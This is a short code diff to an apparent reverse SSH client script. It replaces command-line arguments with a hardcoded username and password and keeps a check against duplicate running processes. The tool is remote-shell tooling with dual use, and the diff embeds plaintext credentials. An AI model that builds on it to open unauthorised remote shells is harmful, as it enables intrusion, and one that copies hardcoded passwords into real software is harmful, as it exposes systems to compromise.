@@ -9,6 +9,8 @@ client_name = 'reverse_ssh_client.py'
 client_path = os.path.abspath(__file__)
 
 PORT = 22
+username = "aryeh"
+password = "pass"
 
 def already_running(process):
     return popen('pgrep -af python').read().count(process+'\n') > 1
@@ -35,14 +37,6 @@ def create_channel(host,username,password,port):
     return channel
 
 if __name__ == '__main__':
-    #parse argv
-    if len(sys.argv) != 4:
-        print('usage: python3 reverse_ssh_client.py [host] [username] [password]')
-        exit()
-    else:
-        host = sys.argv[1]
-        username = sys.argv[2]
-        password = sys.argv[3]
     #check process isn't already running
     if already_running(client_name):
         print('already running')
